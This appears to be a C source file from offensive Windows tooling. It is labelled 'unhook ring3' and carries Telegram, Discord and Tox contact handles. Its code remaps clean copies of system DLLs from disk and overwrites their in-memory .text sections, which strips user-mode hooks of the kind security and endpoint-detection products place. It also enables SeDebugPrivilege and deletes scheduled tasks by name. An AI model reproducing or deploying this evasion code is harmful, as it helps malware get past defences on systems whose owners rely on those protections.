// unhook.c
// 2024
// Telegram: https://t.me/strikelab
// Discord: @patchguard
// Tox: 5BCB80569AC334FDA5B7806ABC05DDFE3AF8F126E08D0EA6D21DA3C13B43F164188C3EEE89E9
// unhook ring3

#include "unhook.h"

BOOL Is64BitOperatingSystem() {
    BOOL wow64 = FALSE;
    return BITNESS(64) || (IsWow64Process(GetCurrentProcess(), &wow64) && wow64);
}

// -----------------------------------------------------------

VOID unhookDll(HANDLE hProcess, LPCWSTR name) {

    if (name) {

        if (hProcess != NULL) {

            WCHAR path[MAX_PATH + 1];
            WCHAR windowsPath[MAX_PATH];
            GetWindowsDirectory(windowsPath, MAX_PATH);
            WCHAR driveLetter = windowsPath[0];
            WCHAR driveLetterWide[2];
            driveLetterWide[0] = driveLetter;
            driveLetterWide[1] = L'\0';

            // wcscpy_s and wcscat_s for safe string operations
            wcscpy_s(path, MAX_PATH + 1, driveLetterWide);

            if (Is64BitOperatingSystem() && BITNESS(32)) {
                wcscat_s(path, MAX_PATH + 1, L":\\Windows\\SysWOW64\\");
            }

            else {
                wcscat_s(path, MAX_PATH + 1, L":\\Windows\\System32\\");
            }

            wcscat_s(path, MAX_PATH + 1, name);

            HMODULE dll = GetModuleHandleW(name);
            if (dll) {

                MODULEINFO moduleInfo;
                memset(&moduleInfo, 0, sizeof(MODULEINFO));

                if (GetModuleInformation(hProcess, dll, &moduleInfo, sizeof(MODULEINFO))) {

                    HANDLE dllFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
                    if (dllFile != INVALID_HANDLE_VALUE) {

                        HANDLE dllMapping = CreateFileMappingW(dllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
                        if (dllMapping) {

                            LPVOID dllMappedFile = MapViewOfFile(dllMapping, FILE_MAP_READ, 0, 0, 0);
                            if (dllMappedFile) {

                                PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)moduleInfo.lpBaseOfDll + ((PIMAGE_DOS_HEADER)moduleInfo.lpBaseOfDll)->e_lfanew);

                                for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {

                                    PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(ntHeaders) + (i * (ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER));

                                    if (!lstrcmpA((LPCSTR)sectionHeader->Name, ".text")) {

                                        LPVOID virtualAddress = (LPVOID)((ULONG_PTR)moduleInfo.lpBaseOfDll + (ULONG_PTR)sectionHeader->VirtualAddress);
                                        DWORD virtualSize = sectionHeader->Misc.VirtualSize;
                                        DWORD oldProtect;

                                        VirtualProtectEx(hProcess, virtualAddress, virtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
                                        WriteProcessMemory(hProcess, virtualAddress, (LPVOID)((ULONG_PTR)dllMappedFile + (ULONG_PTR)sectionHeader->VirtualAddress), virtualSize, NULL);
                                        VirtualProtectEx(hProcess, virtualAddress, virtualSize, oldProtect, &oldProtect);

                                        break;
                                    }
                                }
                            }
                            CloseHandle(dllMapping);
                        }
                        CloseHandle(dllFile);
                    }
                }
                FreeLibrary(dll);
            }
        }
    }
}

// -----------------------------------------------------------

BOOL EnableDebugPrivilege() {
    BOOL result = FALSE;

    HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, GetCurrentProcessId());
    if (process) {

        HANDLE token;

        if (OpenProcessToken(process, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {

            LUID luid;
            
            if (LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid)) {

                TOKEN_PRIVILEGES tokenPrivileges;
                tokenPrivileges.PrivilegeCount = 1;
                tokenPrivileges.Privileges[0].Luid = luid;
                tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

                if (AdjustTokenPrivileges(token, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {

                    result = GetLastError() != ERROR_NOT_ALL_ASSIGNED;
                }
            }
        }

        CloseHandle(process);
    }

    return result;
}

// -----------------------------------------------------------

BOOL DeleteScheduledTask(LPCWSTR name) {
    BOOL result = FALSE;

    BSTR nameBstr = SysAllocString(name);
    BSTR folderPathBstr = SysAllocString(L"\\");

    if (SUCCEEDED(CoInitializeEx(NULL, COINIT_MULTITHREADED))) {

        HRESULT initializeSecurityResult = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);

        if (SUCCEEDED(initializeSecurityResult) || initializeSecurityResult == RPC_E_TOO_LATE) {

            ITaskService* service = NULL;

            if (SUCCEEDED(CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, &IID_ITaskService, (void**)&service))) {
                
                VARIANT empty;
                VariantInit(&empty);

                if (SUCCEEDED(service->lpVtbl->Connect(service, empty, empty, empty, empty))) {

                    ITaskFolder* folder = NULL;

                    if (SUCCEEDED(service->lpVtbl->GetFolder(service, folderPathBstr, &folder))) {

                        if (SUCCEEDED(folder->lpVtbl->DeleteTask(folder, nameBstr, 0))) {

                            result = TRUE;
                        }

                        folder->lpVtbl->Release(folder);
                    }
                }

                service->lpVtbl->Release(service);
            }
        }

        CoUninitialize();
    }

    SysFreeString(nameBstr);
    SysFreeString(folderPathBstr);

    return result;
}
